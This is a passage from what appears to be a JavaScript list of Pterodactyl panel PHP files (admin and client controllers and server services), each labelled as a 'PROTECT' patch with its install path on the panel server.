    public function __construct(
        protected AlertsMessageBag $alert,
        protected AllocationRepositoryInterface $allocationRepository,
        protected BuildModificationService $buildModificationService,
        protected ConfigRepository $config,
        protected DaemonServerRepository $daemonServerRepository,
        protected DatabaseManagementService $databaseManagementService,
        protected DatabasePasswordService $databasePasswordService,
        protected DatabaseRepositoryInterface $databaseRepository,
        protected DatabaseHostRepository $databaseHostRepository,
        protected ServerDeletionService $deletionService,
        protected DetailsModificationService $detailsModificationService,
        protected ReinstallServerService $reinstallService,
        protected ServerRepositoryInterface $repository,
        protected MountRepository $mountRepository,
        protected NestRepositoryInterface $nestRepository,
        protected ServerConfigurationStructureService $serverConfigurationStructureService,
        protected StartupModificationService $startupModificationService,
        protected SuspensionService $suspensionService
    ) {
    }

    /**
     * Update the details for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function setDetails(Request $request, Server $server): RedirectResponse
    {
        $this->detailsModificationService->handle($server, $request->only([
            'owner_id', 'external_id', 'name', 'description',
        ]));

        $this->alert->success(trans('admin/server.alerts.details_updated'))->flash();

        return redirect()->route('admin.servers.view.details', $server->id);
    }

    /**
     * Toggles the installation status for a server.
     *
* @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function toggleInstall(Server $server): RedirectResponse
    {
        if ($server->status === Server::STATUS_INSTALL_FAILED) {
            throw new DisplayException(trans('admin/server.exceptions.marked_as_failed'));
        }

        $this->repository->update($server->id, [
            'status' => $server->isInstalled() ? Server::STATUS_INSTALLING : null,
        ], true, true);

        $this->alert->success(trans('admin/server.alerts.install_toggled'))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Reinstalls the server with the currently assigned service.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function reinstallServer(Server $server): RedirectResponse
    {
        $this->reinstallService->handle($server);
        $this->alert->success(trans('admin/server.alerts.server_reinstalled'))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Manage the suspension status for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function manageSuspension(Request $request, Server $server): RedirectResponse
    {
        $this->suspensionService->toggle($server, $request->input('action'));
        $this->alert->success(trans('admin/server.alerts.suspension_toggled', [
            'status' => $request->input('action') . 'ed',
        ]))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Update the build configuration for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     * @throws \\Illuminate\\Validation\\ValidationException
     */
    public function updateBuild(Request $request, Server $server): RedirectResponse
    {
        try {
            $this->buildModificationService->handle($server, $request->only([
                'allocation_id', 'add_allocations', 'remove_allocations',
                'memory', 'swap', 'io', 'cpu', 'threads', 'disk',
                'database_limit', 'allocation_limit', 'backup_limit', 'oom_disabled',
            ]));
        } catch (DataValidationException $exception) {
            throw new ValidationException($exception->getValidator());
        }

        $this->alert->success(trans('admin/server.alerts.build_updated'))->flash();

        return redirect()->route('admin.servers.view.build', $server->id);
    }

    /**
     * Start the server deletion process.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Throwable
     */
    public function delete(Request $request, Server $server): RedirectResponse
    {
        $this->deletionService->withForce($request->filled('force_delete'))->handle($server);
        $this->alert->success(trans('admin/server.alerts.server_deleted'))->flash();

        return redirect()->route('admin.servers');
    }

    /**
     * Update the startup command as well as variables.
     *
     * @throws \\Illuminate\\Validation\\ValidationException
     */
    public function saveStartup(Request $request, Server $server): RedirectResponse
    {
        $data = $request->except('_token');
        if (!empty($data['custom_docker_image'])) {
            $data['docker_image'] = $data['custom_docker_image'];
            unset($data['custom_docker_image']);
        }

        try {
            $this->startupModificationService
                ->setUserLevel(User::USER_LEVEL_ADMIN)
                ->handle($server, $data);
        } catch (DataValidationException $exception) {
            throw new ValidationException($exception->getValidator());
        }

        $this->alert->success(trans('admin/server.alerts.startup_changed'))->flash();

        return redirect()->route('admin.servers.view.startup', $server->id);
    }

    /**
     * Creates a new database assigned to a specific server.
     *
     * @throws \\Throwable
     */
    public function newDatabase(StoreServerDatabaseRequest $request, Server $server): RedirectResponse
    {
        $this->databaseManagementService->create($server, [
            'database' => DatabaseManagementService::generateUniqueDatabaseName($request->input('database'), $server->id),
            'remote' => $request->input('remote'),
            'database_host_id' => $request->input('database_host_id'),
            'max_connections' => $request->input('max_connections'),
        ]);

        return redirect()->route('admin.servers.view.database', $server->id)->withInput();
    }

    /**
     * Resets the database password for a specific database on this server.
     *
     * @throws \\Throwable
     */
    public function resetDatabasePassword(Request $request, Server $server): Response
    {
        /** @var \\Pterodactyl\\Models\\Database $database */
        $database = $server->databases()->findOrFail($request->input('database'));

        $this->databasePasswordService->handle($database);

        return response('', 204);
    }

    /**
     * Deletes a database from a server.
     *
     * @throws \\Exception
     */
    public function deleteDatabase(Server $server, Database $database): Response
    {
        $this->databaseManagementService->delete($database);

        return response('', 204);
    }

    /**
     * Add a mount to a server.
     *
     * @throws \\Throwable
     */
    public function addMount(Request $request, Server $server): RedirectResponse
    {
        $mountServer = (new MountServer())->forceFill([
            'mount_id' => $request->input('mount_id'),
            'server_id' => $server->id,
        ]);

        $mountServer->saveOrFail();

        $this->alert->success('Mount was added successfully.')->flash();

        return redirect()->route('admin.servers.view.mounts', $server->id);
    }

    /**
     * Remove a mount from a server.
     */
    public function deleteMount(Server $server, Mount $mount): RedirectResponse
    {
        MountServer::where('mount_id', $mount->id)->where('server_id', $server->id)->delete();

        $this->alert->success('Mount was removed successfully.')->flash();

        return redirect()->route('admin.servers.view.mounts', $server->id);
    }
}`
      },
      {
        name: "PROTECT1 ANTI UPDATE MANAGE (Anti Button Reinstall Status)",
        path: "/var/www/pterodactyl/app/Services/Servers/ReinstallServerService.php",
        file: "ReinstallServerService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Pterodactyl\\Models\\Server;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;

class ReinstallServerService
{
    /**
     * ReinstallService constructor.
     */
    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository
    ) {
    }

    /**
     * Reinstall a server on the remote daemon.
     *
     * @throws \\Throwable
     */
    public function handle(Server $server): Server
    {
        return $this->connection->transaction(function () use ($server) {
            $server->fill(['status' => Server::STATUS_INSTALLING])->save();

            $this->daemonServerRepository->setServer($server)->reinstall();

            return $server->refresh();
        });
    }
}`
      },
      {
        name: "PROTECT1 (Anti Delete Server)",
        path: "/var/www/pterodactyl/app/Services/Servers/ServerDeletionService.php",
        file: "ServerDeletionService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Http\\Response;
use Pterodactyl\\Models\\Server;
use Illuminate\\Support\\Facades\\Log;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Services\\Databases\\DatabaseManagementService;
use Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException;

class ServerDeletionService
{
    protected bool $force = false;

    /**
     * ServerDeletionService constructor.
     */
    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository,
        private DatabaseManagementService $databaseManagementService
    ) {
    }

    /**
     * Set if the server should be forcibly deleted from the panel (ignoring daemon errors) or not.
     */
    public function withForce(bool $bool = true): self
    {
        $this->force = $bool;

        return $this;
    }

    /**
     * Delete a server from the panel and remove any associated databases from hosts.
     *
     * @throws \\Throwable
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
    public function handle(Server $server): void
    {
        try {
            $this->daemonServerRepository->setServer($server)->delete();
        } catch (DaemonConnectionException $exception) {
            if (!$this->force && $exception->getStatusCode() !== Response::HTTP_NOT_FOUND) {
                throw $exception;
            }

            Log::warning($exception);
        }

        $this->connection->transaction(function () use ($server) {
            foreach ($server->databases as $database) {
                try {
                    $this->databaseManagementService->delete($database);
                } catch (\\Exception $exception) {
                    if (!$this->force) {
                        throw $exception;
                    }

                    $database->delete();

                    Log::warning($exception);
                }
            }

            $server->delete();
        });
    }
}`
      },
      {
        name: "PROTECT2 (ANTI INTIP USERS & ANTI CADMIN)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/UserController.php",
        file: "UserController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\User;
use Pterodactyl\\Models\\Model;
use Illuminate\\Support\\Collection;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Spatie\\QueryBuilder\\QueryBuilder;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Illuminate\\Contracts\\Translation\\Translator;
use Pterodactyl\\Services\\Users\\UserUpdateService;
use Pterodactyl\\Traits\\Helpers\\AvailableLanguages;
use Pterodactyl\\Services\\Users\\UserCreationService;
use Pterodactyl\\Services\\Users\\UserDeletionService;
use Pterodactyl\\Http\\Requests\\Admin\\UserFormRequest;
use Pterodactyl\\Http\\Requests\\Admin\\NewUserFormRequest;
use Pterodactyl\\Contracts\\Repository\\UserRepositoryInterface;

class UserController extends Controller
{
    use AvailableLanguages;

    /**
     * UserController constructor.
     */
    public function __construct(
        protected AlertsMessageBag $alert,
        protected UserCreationService $creationService,
        protected UserDeletionService $deletionService,
        protected Translator $translator,
        protected UserUpdateService $updateService,
        protected UserRepositoryInterface $repository,
        protected ViewFactory $view
    ) {
    }

    /**
     * Display user index page.
     */
    public function index(Request $request): View
    {
        $users = QueryBuilder::for(
            User::query()->select('users.*')
                ->selectRaw('COUNT(DISTINCT(subusers.id)) as subuser_of_count')
                ->selectRaw('COUNT(DISTINCT(servers.id)) as servers_count')
                ->leftJoin('subusers', 'subusers.user_id', '=', 'users.id')
                ->leftJoin('servers', 'servers.owner_id', '=', 'users.id')
                ->groupBy('users.id')
        )
            ->allowedFilters(['username', 'email', 'uuid'])
            ->allowedSorts(['id', 'uuid'])
            ->paginate(50);

        return $this->view->make('admin.users.index', ['users' => $users]);
    }

    /**
     * Display new user page.
     */
    public function create(): View
    {
        return $this->view->make('admin.users.new', [
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    /**
     * Display user view page.
     */
    public function view(User $user): View
    {
        return $this->view->make('admin.users.view', [
            'user' => $user,
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    /**
     * Delete a user from the system.
     *
     * @throws \\Exception
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
    public function delete(Request $request, User $user): RedirectResponse
    {
        if ($request->user()->id === $user->id) {
            throw new DisplayException($this->translator->get('admin/user.exceptions.user_has_servers'));
        }

        $this->deletionService->handle($user);

        return redirect()->route('admin.users');
    }

    /**
     * Create a user.
     *
     * @throws \\Exception
     * @throws \\Throwable
     */
    public function store(NewUserFormRequest $request): RedirectResponse
    {
        $user = $this->creationService->handle($request->normalize());
        $this->alert->success($this->translator->get('admin/user.notices.account_created'))->flash();

        return redirect()->route('admin.users.view', $user->id);
    }

    /**
     * Update a user on the system.
     *
* @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function update(UserFormRequest $request, User $user): RedirectResponse
    {
        $this->updateService
            ->setUserLevel(User::USER_LEVEL_ADMIN)
            ->handle($user, $request->normalize());

        $this->alert->success(trans('admin/user.notices.account_updated'))->flash();

        return redirect()->route('admin.users.view', $user->id);
    }

    /**
     * Get a JSON response of users on the system.
     */
    public function json(Request $request): Model|Collection
    {
        $users = QueryBuilder::for(User::query())->allowedFilters(['email'])->paginate(25);

        // Handle single user requests.
        if ($request->query('user_id')) {
            $user = User::query()->findOrFail($request->input('user_id'));
            $user->md5 = md5(strtolower($user->email));

            return $user;
        }

        return $users->map(function ($item) {
            $item->md5 = md5(strtolower($item->email));

            return $item;
        });
    }
}`
      },      
      {
        name: "PROTECT3 (ANTI INTIP LOCATION)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/LocationController.php",
        file: "LocationController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\View\\View;
use Pterodactyl\\Models\\Location;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Http\\Requests\\Admin\\LocationFormRequest;
use Pterodactyl\\Services\\Locations\\LocationUpdateService;
use Pterodactyl\\Services\\Locations\\LocationCreationService;
use Pterodactyl\\Services\\Locations\\LocationDeletionService;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;

class LocationController extends Controller
{
    /**
     * LocationController constructor.
     */
    public function __construct(
        protected AlertsMessageBag $alert,
        protected LocationCreationService $creationService,
        protected LocationDeletionService $deletionService,
        protected LocationRepositoryInterface $repository,
        protected LocationUpdateService $updateService,
        protected ViewFactory $view
    ) {
    }

    /**
     * Return the location overview page.
     */
    public function index(): View
    {
        return $this->view->make('admin.locations.index', [
            'locations' => $this->repository->getAllWithDetails(),
        ]);
    }

    /**
     * Return the location view page.
     *
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function view(int $id): View
    {
        return $this->view->make('admin.locations.view', [
            'location' => $this->repository->getWithNodes($id),
        ]);
    }

    /**
     * Handle request to create new location.
     *
     * @throws \\Throwable
     */
    public function create(LocationFormRequest $request): RedirectResponse
    {
        $location = $this->creationService->handle($request->normalize());
        $this->alert->success('Location was created successfully.')->flash();

        return redirect()->route('admin.locations.view', $location->id);
    }

    /**
     * Handle request to update or delete location.
     *
     * @throws \\Throwable
     */
    public function update(LocationFormRequest $request, Location $location): RedirectResponse
    {
        if ($request->input('action') === 'delete') {
            return $this->delete($location);
        }

        $this->updateService->handle($location->id, $request->normalize());
        $this->alert->success('Location was updated successfully.')->flash();

        return redirect()->route('admin.locations.view', $location->id);
    }

    /**
     * Delete a location from the system.
     *
     * @throws \\Exception
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
    public function delete(Location $location): RedirectResponse
    {
        try {
            $this->deletionService->handle($location->id);

            return redirect()->route('admin.locations');
        } catch (DisplayException $ex) {
            $this->alert->danger($ex->getMessage())->flash();
        }

        return redirect()->route('admin.locations.view', $location->id);
    }
}`
      },
      {
        name: "PROTECT4 (ANTI INTIP NODES)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Nodes/NodeController.php",
        file: "NodeController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Nodes;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\Node;
use Spatie\\QueryBuilder\\QueryBuilder;
use Pterodactyl\\Http\\Controllers\\Controller;
use Illuminate\\Contracts\\View\\Factory as ViewFactory;

class NodeController extends Controller
{
    /**
     * NodeController constructor.
     */
    public function __construct(private ViewFactory $view)
    {
    }

    /**
     * Returns a listing of nodes on the system.
     */
    public function index(Request $request): View
    {
        $nodes = QueryBuilder::for(
            Node::query()->with('location')->withCount('servers')
        )
            ->allowedFilters(['uuid', 'name'])
            ->allowedSorts(['id'])
            ->paginate(25);

        return $this->view->make('admin.nodes.index', ['nodes' => $nodes]);
    }
}`
      },
      {
        name: "PROTECT5 (ANTI INTIP NEST)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Nests/NestController.php",
        file: "NestController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Nests;

use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Services\\Nests\\NestUpdateService;
use Pterodactyl\\Services\\Nests\\NestCreationService;
use Pterodactyl\\Services\\Nests\\NestDeletionService;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Http\\Requests\\Admin\\Nest\\StoreNestFormRequest;

class NestController extends Controller
{
    /**
     * NestController constructor.
     */
    public function __construct(
        protected AlertsMessageBag $alert,
        protected NestCreationService $nestCreationService,
        protected NestDeletionService $nestDeletionService,
        protected NestRepositoryInterface $repository,
        protected NestUpdateService $nestUpdateService,
        protected ViewFactory $view
    ) {
    }

    /**
     * Render nest listing page.
     *
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function index(): View
    {
        return $this->view->make('admin.nests.index', [
            'nests' => $this->repository->getWithCounts(),
        ]);
    }

    /**
     * Render nest creation page.
     */
    public function create(): View
    {
        return $this->view->make('admin.nests.new');
    }

    /**
     * Handle the storage of a new nest.
     *
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     */
    public function store(StoreNestFormRequest $request): RedirectResponse
    {
        $nest = $this->nestCreationService->handle($request->normalize());
        $this->alert->success(trans('admin/nests.notices.created', ['name' => htmlspecialchars($nest->name)]))->flash();

        return redirect()->route('admin.nests.view', $nest->id);
    }

    /**
     * Return details about a nest including all the eggs and servers per egg.
     *
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function view(int $nest): View
    {
        return $this->view->make('admin.nests.view', [
            'nest' => $this->repository->getWithEggServers($nest),
        ]);
    }

    /**
     * Handle request to update a nest.
     *
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function update(StoreNestFormRequest $request, int $nest): RedirectResponse
    {
        $this->nestUpdateService->handle($nest, $request->normalize());
        $this->alert->success(trans('admin/nests.notices.updated'))->flash();

        return redirect()->route('admin.nests.view', $nest);
    }

    /**
     * Handle request to delete a nest.
     *
     * @throws \\Pterodactyl\\Exceptions\\Service\\HasActiveServersException
     */
    public function destroy(int $nest): RedirectResponse
    {
        $this->nestDeletionService->handle($nest);
        $this->alert->success(trans('admin/nests.notices.deleted'))->flash();

        return redirect()->route('admin.nests');
    }
}`
      },
      {
        name: "PROTECT6 (ANTI INTIP SETTINGS)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Settings/IndexController.php",
        file: "IndexController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Settings;

use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\Contracts\\Console\\Kernel;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Traits\\Helpers\\AvailableLanguages;
use Pterodactyl\\Services\\Helpers\\SoftwareVersionService;
use Pterodactyl\\Contracts\\Repository\\SettingsRepositoryInterface;
use Pterodactyl\\Http\\Requests\\Admin\\Settings\\BaseSettingsFormRequest;

class IndexController extends Controller
{
    use AvailableLanguages;

    /**
     * IndexController constructor.
     */
    public function __construct(
        private AlertsMessageBag $alert,
        private Kernel $kernel,
        private SettingsRepositoryInterface $settings,
        private SoftwareVersionService $versionService,
        private ViewFactory $view
    ) {
    }

    /**
     * Render the UI for basic Panel settings.
     */
    public function index(): View
    {
        return $this->view->make('admin.settings.index', [
            'version' => $this->versionService,
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    /**
     * Handle settings update.
     *
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function update(BaseSettingsFormRequest $request): RedirectResponse
    {
        foreach ($request->normalize() as $key => $value) {
            $this->settings->set('settings::' . $key, $value);
        }

        $this->kernel->call('queue:restart');
        $this->alert->success('Panel settings have been updated successfully and the queue worker was restarted to apply these changes.')->flash();

        return redirect()->route('admin.settings');
    }
}`
      },
      {
        name: "PROTECT7 (ANTI AKSES FILE & DOWNLOAD)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/FileController.php",
        file: "FileController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client\\Servers;

use Carbon\\CarbonImmutable;
use Illuminate\\Http\\Response;
use Pterodactyl\\Models\\Server;
use Illuminate\\Http\\JsonResponse;
use Pterodactyl\\Facades\\Activity;
use Pterodactyl\\Services\\Nodes\\NodeJWTService;
use Pterodactyl\\Repositories\\Wings\\DaemonFileRepository;
use Pterodactyl\\Transformers\\Api\\Client\\FileObjectTransformer;
use Pterodactyl\\Http\\Controllers\\Api\\Client\\ClientApiController;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\CopyFileRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\PullFileRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\ListFilesRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\ChmodFilesRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\DeleteFileRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\RenameFileRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\CreateFolderRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\CompressFilesRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\DecompressFilesRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\GetFileContentsRequest;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\WriteFileContentRequest;

class FileController extends ClientApiController
{
    /**
     * FileController constructor.
     */
    public function __construct(
        private NodeJWTService $jwtService,
        private DaemonFileRepository $fileRepository
    ) {
        parent::__construct();
    }

    /**
     * Returns a listing of files in a given directory.
     *
     * @throws \\Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException
     */
    public function directory(ListFilesRequest $request, Server $server): array
    {
        $contents = $this->fileRepository
            ->setServer($server)
            ->getDirectory($request->get('directory') ?? '/');

        return $this->fractal->collection($contents)
            ->transformWith($this->getTransformer(FileObjectTransformer::class))
            ->toArray();
    }

    /**
     * Return the contents of a specified file for the user.
     *
     * @throws \\Throwable
     */
    public function contents(GetFileContentsRequest $request, Server $server): Response
    {
        $response = $this->fileRepository->setServer($server)->getContent(
            $request->get('file'),
            config('pterodactyl.files.max_edit_size')
        );

        Activity::event('server:file.read')->property('file', $request->get('file'))->log();

        return new Response($response, Response::HTTP_OK, ['Content-Type' => 'text/plain']);
    }

    /**
     * Generates a one-time token with a link that the user can use to
     * download a given file.
     *
     * @throws \\Throwable
     */
    public function download(GetFileContentsRequest $request, Server $server): array
    {
        $token = $this->jwtService
            ->setExpiresAt(CarbonImmutable::now()->addMinutes(15))
            ->setUser($request->user())
            ->setClaims([
                'file_path' => rawurldecode($request->get('file')),
                'server_uuid' => $server->uuid,
            ])
            ->handle($server->node, $request->user()->id . $server->uuid);

        Activity::event('server:file.download')->property('file', $request->get('file'))->log();

        return [
            'object' => 'signed_url',
            'attributes' => [
                'url' => sprintf(
                    '%s/download/file?token=%s',
                    $server->node->getConnectionAddress(),
                    $token->toString()
                ),
            ],
        ];
    }

    /**
     * Writes the contents of the specified file to the server.
     *
     * @throws \\Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException
     */
    public function write(WriteFileContentRequest $request, Server $server): JsonResponse
    {
        $this->fileRepository->setServer($server)->putContent($request->get('file'), $request->getContent());

        Activity::event('server:file.write')->property('file', $request->get('file'))->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    /**
     * Creates a new folder on the server.
     *
     * @throws \\Throwable
     */
    public function create(CreateFolderRequest $request, Server $server): JsonResponse
    {
        $this->fileRepository
            ->setServer($server)
            ->createDirectory($request->input('name'), $request->input('root', '/'));

        Activity::event('server:file.create-directory')
            ->property('name', $request->input('name'))
            ->property('directory', $request->input('root'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    /**
     * Renames a file on the remote machine.
     *
     * @throws \\Throwable
     */
    public function rename(RenameFileRequest $request, Server $server): JsonResponse
    {
        $this->fileRepository
            ->setServer($server)
            ->renameFiles($request->input('root'), $request->input('files'));

        Activity::event('server:file.rename')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    /**
     * Copies a file on the server.
     *
     * @throws \\Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException
     */
    public function copy(CopyFileRequest $request, Server $server): JsonResponse
    {
        $this->fileRepository
            ->setServer($server)
            ->copyFile($request->input('location'));

        Activity::event('server:file.copy')->property('file', $request->input('location'))->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    /**
     * @throws \\Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException
     */
    public function compress(CompressFilesRequest $request, Server $server): array
    {
        $file = $this->fileRepository->setServer($server)->compressFiles(
            $request->input('root'),
            $request->input('files')
        );

        Activity::event('server:file.compress')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return $this->fractal->item($file)
            ->transformWith($this->getTransformer(FileObjectTransformer::class))
            ->toArray();
    }

    /**
     * @throws \\Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException
     */
    public function decompress(DecompressFilesRequest $request, Server $server): JsonResponse
    {
        set_time_limit(300);

        $this->fileRepository->setServer($server)->decompressFile(
            $request->input('root'),
            $request->input('file')
        );

        Activity::event('server:file.decompress')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('file'))
            ->log();

        return new JsonResponse([], JsonResponse::HTTP_NO_CONTENT);
    }

    /**
     * Deletes files or folders for the server in the given root directory.
     *
     * @throws \\Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException
     */
    public function delete(DeleteFileRequest $request, Server $server): JsonResponse
    {
        $this->fileRepository->setServer($server)->deleteFiles(
            $request->input('root'),
            $request->input('files')
        );

        Activity::event('server:file.delete')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    /**
     * Updates file permissions for file(s) in the given root directory.
     *
     * @throws \\Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException
     */
    public function chmod(ChmodFilesRequest $request, Server $server): JsonResponse
    {
        $this->fileRepository->setServer($server)->chmodFiles(
            $request->input('root'),
            $request->input('files')
        );

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    /**
     * Requests that a file be downloaded from a remote location by Wings.
     *
     * @throws \\Throwable
     */
    public function pull(PullFileRequest $request, Server $server): JsonResponse
    {
        $this->fileRepository->setServer($server)->pull(
            $request->input('url'),
            $request->input('directory'),
            $request->safe(['filename', 'use_header', 'foreground'])
        );

        Activity::event('server:file.pull')
            ->property('directory', $request->input('directory'))
            ->property('url', $request->input('url'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }
}`
      },
      {
        name: "PROTECT8 (ANTI INTIP SERVER)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ServerController.php",
        file: "ServerController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client\\Servers;

use Pterodactyl\\Models\\Server;
use Pterodactyl\\Transformers\\Api\\Client\\ServerTransformer;
use Pterodactyl\\Services\\Servers\\GetUserPermissionsService;
use Pterodactyl\\Http\\Controllers\\Api\\Client\\ClientApiController;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\GetServerRequest;

class ServerController extends ClientApiController
{
    /**
     * ServerController constructor.
     */
    public function __construct(private GetUserPermissionsService $permissionsService)
    {
        parent::__construct();
    }

    /**
     * Transform an individual server into a response that can be consumed by a
     * client using the API.
     */
    public function index(GetServerRequest $request, Server $server): array
    {
        return $this->fractal->item($server)
            ->transformWith($this->getTransformer(ServerTransformer::class))
            ->addMeta([
                'is_server_owner' => $request->user()->id === $server->owner_id,
                'user_permissions' => $this->permissionsService->handle($server, $request->user()),
            ])
            ->toArray();
    }
}`
      },
      {
        name: "PROTECT9 (ANTI INTIP APIKEY)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/ApiController.php",
        file: "ApiController.php",
        code: `<?php  
  
namespace Pterodactyl\\Http\\Controllers\\Admin;  
  
use Illuminate\\View\\View;  
use Illuminate\\Http\\Request;  
use Illuminate\\Http\\Response;  
use Pterodactyl\\Models\\ApiKey;  
use Illuminate\\Http\\RedirectResponse;  
use Prologue\\Alerts\\AlertsMessageBag;  
use Pterodactyl\\Services\\Acl\\Api\\AdminAcl;  
use Illuminate\\View\\Factory as ViewFactory;  
use Pterodactyl\\Http\\Controllers\\Controller;  
use Pterodactyl\\Services\\Api\\KeyCreationService;  
use Pterodactyl\\Contracts\\Repository\\ApiKeyRepositoryInterface;  
